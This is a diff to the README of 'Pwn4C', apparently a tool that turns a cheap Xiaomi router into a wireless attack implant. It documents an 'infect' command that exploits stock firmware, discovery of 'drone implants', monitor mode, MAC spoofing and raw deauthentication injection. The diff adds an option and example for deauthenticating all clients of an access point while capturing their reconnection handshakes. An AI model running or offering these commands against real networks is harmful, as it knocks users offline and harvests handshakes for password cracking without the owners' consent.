@@ -31,11 +31,11 @@ Pwn4C converts a stock Xiaomi Mi Router 4C (MediaTek MT7628N, ~$15 USD) into a h
 | Command | Syntax / Example | Description |
 |---|---|---|
 | `infect` | `pwn4c infect 192.168.31.1 -f sysupgrade.bin` | Exploits stock Xiaomi firmware and directly flashes Pwn4C OS (air-gapped) |
-| `discover` | `pwn4c discover [-t 3]` | Scans subnet for active Pwn4C drone implants via UDP broadcast |
+| `discover` | `pwn4c discover [-t 3] [--wait-timeout 0]` | Scans subnet for active Pwn4C drone implants via UDP broadcast (keeps retrying by default) |
 | `status` | `pwn4c status [target_ip] [--psk secret]` | Queries live telemetry, drop counters, and radio state over TCP |
 | `monitor` | `pwn4c monitor [target_ip] -c 6 -o capture.pcap [--hop]` | Starts 802.11 monitor mode, optional BPF filter/hopper, and streams PCAP |
 | `hop` | `pwn4c hop [target_ip] -d 250 -c 1,6,11` | Starts autonomous drone-side channel hopping across specified channels |
-| `deauth` | `pwn4c deauth [target_ip] -b <bssid> [-c <client>]` | Injects raw IEEE 802.11 deauthentication frames via non-blocking TX queue |
+| `deauth` | `pwn4c deauth [target_ip] -b <bssid> [-c <client>] [--monitor -o hs.pcap]` | Injects raw IEEE 802.11 deauthentication frames; `--monitor` captures the handshake in the same session |
 | `config` | `pwn4c config [target_ip] --power 20 --mac random` | Adjusts TX power, randomizes/spoofs MAC, or restores normal mode |
 
 ---
@@ -97,6 +97,9 @@ pwn4c monitor --hop --channels 1,6,11 --dwell 250 -o - | wireshark -k -i -
 ### 5. RF Attacks & Hardware Configuration
 
 ```bash
+# Deauth all clients of an AP and capture the reconnection handshakes in one session
+pwn4c deauth -b AA:BB:CC:DD:EE:FF -i 6 --monitor -o handshake.pcap
+
 # Inject 20 deauth frames against target AP client with 10ms pacing
 pwn4c deauth -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 -i 6 -n 20 --interval 10
 
